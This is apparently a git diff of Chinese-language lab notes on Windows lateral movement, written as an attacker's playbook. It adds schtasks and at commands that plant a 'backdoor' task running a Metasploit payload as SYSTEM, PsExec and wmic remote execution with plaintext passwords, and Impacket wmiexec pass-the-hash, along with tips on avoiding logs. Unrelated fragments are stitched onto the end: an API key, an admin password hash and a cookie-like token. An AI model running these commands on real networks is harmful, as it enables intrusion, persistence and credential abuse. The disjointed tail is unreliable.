@@ -280,7 +280,16 @@ net time \\10.10.10.80
 
 ```
 C:\>at \\127.0.0.1 11:05 srv.exe 
-用at命令启动srv.exe吧（这里设置的时间要比主机时间快，不然你怎么启动啊，呵呵！） 
+用at命令启动srv.exe吧（） 
+```
+
+![image-20240227195323569](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227195323569.png)
+
+删除计划任务
+
+```java
+at \\192.168.183.130 1/delete
+//1为计划任务的ID
 ```
 
 6、访问/删除路径：
@@ -303,13 +312,195 @@ net use \\127.0.0.1\ipc$ /del
 tasklist /S 192.168.183.130 /U administrator /P liu78963
 ```
 
+#### 需要注意一点的是at命令在，windows server 2008后被废除了，用schtasks.exe代替了
 
+### 利用schtasks 命令
+
+1. 先与目标主机建立ipc连接。
+
+2. 然后使用copy命令远程操作，将metasploit生成的payload文件shell.exe复制到目标系统C盘中。
+
+3. 在目标主机DC上创建一个名称为“backdoor”的计划任务。该计划任务每分钟启动一次，启动程序为我们之前到C盘下的shell.exe，启动权限为system。命令如下：
+
+```java
+schtasks /create /s 192.168.183.130 /tn backdoor /sc minute /mo 1  /tr c:\shell.exe /ru system /f
+```
+
+在没有建立ipc连接时，要加上/u和/p参数分别设置用户名和密码。
+
+(这里建议加上 /u /p 不然会一直报错，拒绝访问)
+
+```java
+schtasks /create /s 10.10.10.80 /u administrator /p 1qaz@WSX /tn backdoor /sc minute /mo 1  /tr whoami >C:\Users\c'x'k\Desktop\二队\result.txt /ru system /f
+```
+
+![image-20240227200833379](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227200833379.png)
+
+`这里我直接这样 whoami是不对的，下文会提到这一点`
+
+####  执行如下命令立即运行该计划任务
+
+```java
+schtasks /run /s 192.168.183.130 /i /tn backdoor
+// i：忽略任何限制立即运行任务
+
+schtasks /run /s 192.168.183.130 /i /tn backdoor /u administrator /p Liu78963   // 遇到上面所说的报错时执行加上/u和/p参数分别设置高权限用户名和密码
+```
+
+#### 强制删除该计划任务
+
+```java
+schtasks /delete /s 10.10.10.80 /tn "backdoor" /f
+```
+
+·正确的利用schtasks计划任务直接执行系统命令，由于不回回显，我们需要将执行的结果写到一个文本文件中，
+
+```java
+schtasks /create /s 10.10.10.80 /u administrator /p 1qaz@WSX /tn test /sc minute /mo 1 /tr "C:\Windows\System32\cmd.exe /c 'whoami > C:\Users\c'x'k\Desktop\二队\result.txt'" /ru system /f
+
+C:\Users\c'x'k>schtasks /create /s 10.10.10.80 /u administrator /p 1qaz@WSX /tn test2 /sc minute /mo 1 /tr "C:\Windows\System32\cmd.exe /c 'whoami > C:\JYcxk.txt'" /ru system /f
+成功: 成功创建计划任务 "test2"。
+
+C:\Users\c'x'k>schtasks /run /s 10.10.10.80 /i /tn test2
+错误: 拒绝访问。
+
+C:\Users\c'x'k>schtasks /run /s 10.10.10.80 /u administrator /p 1qaz@WSX /i /tn test2
+成功: 尝试运行 "test2"。
+```
+
+![image-20240227201941362](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227201941362.png)
+
+这里本机是windows主机，控制的是我的虚拟机（结果是出现在被控制的主机上）
+
+![image-20240227202035935](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227202035935.png)
+
+#### 最后利用type 命令远程查看目标主机上的result.txt文件即可
+
+```java
+type \\10.10.10.80\c$\JYcxk.txt
+```
+
+![image-20240227202223628](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227202223628.png)
+
+
+
+### msf下的PsExec模块
+
+![image-20240227202826058](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227202826058.png)
+
+常用的模块有：
+
+```java
+exploit/windows/smb/psexec           // 用psexec执行系统命令,与psexec.exe相同
+exploit/windows/smb/psexec_psh       // 使用powershell作为payload(PsExec的PowerShell版本)
+auxiliary/admin/smb/psexec_command   // 在目标机器上执行系统命令
+exploit/windows/smb/ms17_010_psexec
+```
+
+```java
+psexec_psh主要是由powershell实现的免杀效果优于psexec
+但是Windows 7、Windows Server 2008及以上版本的操作系统才默认有powershell
+```
+
+```java
+set rhosts 192.168.52.138
+set SMBDomain god
+set SMBUser Liukaifeng01
+set SMBPass Liufupeng123       // 设置明文密码或设置哈希来进行PTH
+run
+```
+
+其他的那几个模块的使用方法与exploit/windows/smb/psexec相同。这些模块不仅可以指定用户明文密码，还可以直接指定哈希值来进行哈希传递攻击。
+
+**注意：在使用psexec执行远程命令时，会在目标系统中创建一个psexec服务。命令执行后，psexec服务将会被自动删除。由于创建或删除服务时会产生大量的日志，所以会在攻击溯源时通过日志反推攻击流程。**
+
+### 利用WMI来横向渗透
+
+WMI的全名为 "Windows Management Instrumentation"。WMI是由一系列工具集成的，可以通过/node选项使用端口135上的远程过程调用（PRC）进行通信以进行 远程 访问，允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。
+
+```java
+因为psexec在内网中被严格监控，被很多厂商加入了黑名单，而WMI默认不回将操作记录在日志中，同时攻击脚本无需写入到磁盘，具有极高的隐蔽性。
+```
+
+注意：使用WMIC连接远程主机，需要目标主机开放135和445端口。(135 端⼝是 WMIC 默认的管理端⼝，而 wimcexec 使⽤445端⼝传回显)
+
+```java
+wmic /node:10.10.10.80 /USER:administrator PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1
+// wmic /node:"[full machine name]" /USER:"[domain]\[username]" PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1
+```
+
+#### 查询远程进程信息
+
+```java
+wmic /node:10.10.10.80 /user:administrator /password:1qaz@WSX process list brief
+```
+
+![image-20240227204814224](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227204814224.png)
+
+#### 远程创建进程
+
+```java
+wmic /node:10.10.10.80 /user:administrator /password:1qaz@WSX process call create "cmd.exe /c ipconfig > C:\result.txt"
+
+wmic /node:192.168.183.130 /user:administrator /password:Liu78963 process call create "cmd.exe /c <命令> > C:\result.txt"
+
+wmic /node:192.168.183.130 /user:administrator /password:Liu78963 process call create "目录\backdoor.exe"
+
+// /node：指定将对其进行操作的服务器
+type \\192.168.52.138\c$\result.txt
+```
+
+![image-20240227205955665](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227205955665.png)
+
+### WMIEXEC
+
+该脚本主要在从Linux像Windows进行横向渗透时使用，十分强大，可以走socks代理进入内网。
+
+本地复现失败
+
+![image-20240227213842195](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227213842195.png)
+
+![image-20240227213824565](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227213824565.png)
+
+#### 2.通过wmiexec对WMI进行PTH
+
+PTH攻击除了通过SMB进行以外，还可以使用WMI进行。下面我们使用Impacket中的wmiexec进行PTH攻击。
+
+在kali下载好Impacket后，执行
+
+python3 wmiexec.py -hashes 00000000000000000000000000000000:3766c17d09689c438a072a33270cb6f5 test.com/Administrator@192.168.1.2，执行结果如图1-5所示。
+
+![image-20240227213756264](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227213756264.png)
+
+![image-20240227213659445](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227213659445.png)
 
 
 
 
 
 ```java
-PsExec.exe -accepteula \\192.168.52.138 -u god\liukaifeng01 -p Liufupeng123 -s cmd.exe
+<item>
+<apikey>cc6f97fbc2931e8118e6057aa7421177</apikey>
+</item>
 ```
+
+```java
+<item>
+<USR>admin</USR>
+<NAME/>
+<PWD>3b62ac676e640aff413dbbe602337cdfc7fc2497</PWD>
+<EMAIL>admin@qq.com</EMAIL>
+<HTMLEDITOR>1</HTMLEDITOR>
+<TIMEZONE>Asia/Shanghai</TIMEZONE>
+<LANG>en_US</LANG>
+</item>
+```
+
+
+
+```java
+admin;48fd5258d478eec2a8f417f358c767c992f01b51=8ce411833fcfaedf4fcf5390132a153c00e0482c
+```
+
+
 
